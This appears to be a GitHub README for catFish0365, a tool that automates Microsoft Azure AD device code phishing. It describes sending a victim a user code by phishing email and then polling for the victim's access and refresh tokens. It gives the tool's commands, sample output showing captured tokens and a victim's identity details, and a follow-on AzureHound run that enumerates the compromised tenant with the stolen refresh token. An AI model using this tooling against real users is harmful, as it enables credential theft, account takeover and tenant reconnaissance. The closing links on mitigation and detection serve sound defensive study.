# catFish0365

<img src="images/catfish.png" width="300px">

***`catFish0365` is a simple program to automate device code phishing attacks.***

## Attack Flow

 * Step 1: The program generates a user code by requesting the [Azure AD devicecode endpoint](https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0)
 * Step 2: The user code is sent to the victim (e.g. phishing email sent to the victim)
 * Step 3: The victim opens phishing email and inputs the user code by visiting the [devicelogin url](https://microsoft.com/devicelogin)
 * Step 4: the victim logs into his account
 * Step 5: The program polls the Azure AD for the authentication status until it gets his refresh and access tokens (successfull login) by requesting the [OAuth endpoint](https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0)

## Usage
```shell
Usage: catFish0365 <command>

A tool to automate device code phishing attacks by @froyo75

Flags:
  -h, --help                                               Show context-sensitive help.
  -c, --clientid="d3590ed6-52b3-4102-aeff-aad2292ab01c"    The Application (client) ID of an Azure App to target (default: d3590ed6-52b3-4102-aeff-aad2292ab01c).
  -r, --resource="https://graph.windows.net"               The resource to request access tokens.
  -o, --out-path=STRING                                    Logging output to a specific file.
  -v, --version                                            Print version information and quit.

Commands:
  exploitdcauth
    Launch device code phishing attack.

  getaccesstoken <refreshtoken>
    Get a new access token for the given clientid and resource using the given refresh token.

Run "catFish0365 <command> --help" for more information on a command.

catFish0365: error: expected one of "exploitdcauth",  "getaccesstoken"
```

**To perform the device code phishing attack**
```shell
./catFish0365 exploitdcauth
10 Apr 2023 17:41:52 INF [*] Generating a new user code
10 Apr 2023 17:41:55 INF [+] User Code => CKQUNSU3H (https://microsoft.com/devicelogin)
10 Apr 2023 17:41:55 DBG [*] Authorization Pending...
10 Apr 2023 17:43:31 DBG [*] Authorization Succeeded !
10 Apr 2023 17:43:31 INF [+] TID: 9188040d-6c67-4c5b-b112-36a304b66dad
10 Apr 2023 17:43:31 INF [+] APPID: d0beb0cf-dd33-40ba-9c31-08f498437115
10 Apr 2023 17:43:31 INF [+] OID: 4af8c092-9633-4547-9e96-c32b09ea022b
10 Apr 2023 17:43:31 INF [+] AMR: pwd, mfa
10 Apr 2023 17:43:31 INF [+] UPN: jdoe@contoso.com
10 Apr 2023 17:43:31 INF [+] NAME: John Doe
10 Apr 2023 17:43:31 INF [+] FAMILY NAME: Doe
10 Apr 2023 17:43:31 INF [+] GIVEN NAME: John
10 Apr 2023 17:43:31 INF [+] IP ADDRESS: 20.81.111.85
10 Apr 2023 17:43:31 INF [+] REGION: EU
10 Apr 2023 17:43:31 INF [+] Access Token => eyJ0[...]AMJA
10 Apr 2023 17:43:31 INF [+] Refresh Token => 0.AT[...]hoK4
```

**To get a new Azure AD access token for the given clientid `d3590ed6-52b3-4102-aeff-aad2292ab01c` (Microsoft Office) and resource `https://graph.windows.net` using the given refresh token**
```shell
 ./catFish0365 getaccesstoken 0.AT[...]hoK4
10 Apr 2023 17:58:45 INF [*] Getting a new access token for the given resource: https://graph.windows.net
10 Apr 2023 17:58:46 DBG [*] Successfully got a new access token !
10 Apr 2023 17:58:46 INF [+] Access Token => eyJ0[...]qEWQ
10 Apr 2023 17:58:46 INF [+] Refresh Token => 0.AT[...]e3QY
```

**To start [azurehound](https://github.com/BloodHoundAD/AzureHound) data collection using the acquired refresh token**
```shell
azurehound.exe list --tenant "contoso.com" -r 0.AT[...]hoK4  -o output.json
AzureHound v1.2.0
Created by the BloodHound Enterprise team - https://bloodhoundenterprise.io
2023-04-10T18:22:39+02:00 INF finished listing all users count=355
2023-04-10T18:22:39+02:00 INF finished listing all apps count=34
2023-04-10T18:22:39+02:00 INF finished listing all groups count=48
2023-04-10T18:22:39+02:00 INF warning: unable to process azure management groups; either the organization has no management groups or azurehound does not have the reader role on the root management group.
2023-04-10T18:22:39+02:00 INF finished listing all management group user access admins
2023-04-10T18:22:39+02:00 INF finished listing all management group owners
2023-04-10T18:22:39+02:00 INF finished listing all management group descendants
2023-04-10T18:22:40+02:00 INF finished listing all tenants count=3
2023-04-10T18:22:40+02:00 INF finished listing all subscriptions count=0
2023-04-10T18:22:40+02:00 INF finished listing all function apps
2023-04-10T18:22:40+02:00 INF finished listing all key vaults
2023-04-10T18:22:40+02:00 INF finished listing all subscription user access admins
2023-04-10T18:22:40+02:00 INF finished listing all storage accounts
2023-04-10T18:22:40+02:00 INF finished listing all automation accounts
2023-04-10T18:22:40+02:00 INF finished listing all resource groups
2023-04-10T18:22:40+02:00 INF finished listing all workflows
2023-04-10T18:22:40+02:00 INF finished listing all virtual machines
2023-04-10T18:22:40+02:00 INF finished listing all subscription owners
[...]
2023-04-10T18:48:55+02:00 INF finished listing members for all groups
2023-04-10T18:48:57+02:00 INF finished listing all devices count=975
2023-04-10T18:48:57+02:00 INF finished listing all device owners
2023-04-10T18:49:20+02:00 INF finished listing all service principals count=788
2023-04-10T18:49:20+02:00 INF finished listing all service principal owners
2023-04-10T18:49:20+02:00 INF finished listing all app role assignments
2023-04-10T18:49:20+02:00 INF collection completed duration=46.8867399s
```

## References

Microsoft OAuth Device Code Phishing:
 * [Microsoft 365 OAuth Device Code Flow and Phishing](https://www.optiv.com/insights/source-zero/blog/microsoft-365-oauth-device-code-flow-and-phishing)
 * [The Art of the Device Code Phish](https://0xboku.com/2021/07/12/ArtOfDeviceCodePhish.html)

Framework to abuse Azure JSON Web Token (JWT):
 * [TokenTactics](https://github.com/rvrsh3ll/TokenTactics)
 * [AADInternals](https://github.com/Gerenios/AADInternals)

Mitigation & Detection methodology:
 * [Mitigation of Microsoft OAuth Device Code Phishing](https://www.optiv.com/insights/source-zero/blog/microsoft-365-oauth-device-code-flow-and-phishing)
 * [Detection Methodology](https://www.inversecos.com/2022/12/how-to-detect-malicious-oauth-device.html)
